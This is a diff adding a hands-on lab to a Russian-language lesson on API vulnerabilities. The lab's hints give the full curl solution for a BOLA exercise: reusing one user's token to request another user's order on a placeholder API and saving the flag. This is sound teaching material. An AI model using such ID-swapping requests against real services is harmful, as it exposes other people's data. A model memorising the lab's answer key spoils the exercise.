@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Три главных класса API-уязвимостей: доступ к чужим объектам, к чужим функциям и присвоение защищённых полей."
+lab:
+  kind: shell
+  title: "Практика: BOLA"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Свой заказ: `curl -s 'http://api.example/v1/orders/1001' -H 'Authorization: Bearer userA-token'`.
+    - Твой заказ — 1001. А что если запросить 1002 с тем же токеном?
+    - `curl -s 'http://api.example/v1/orders/1002' -H 'Authorization: Bearer userA-token'`.
+    - Флаг — последняя строка: `curl -s 'http://api.example/v1/orders/1002' -H 'Authorization: Bearer userA-token' | tail -1 > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
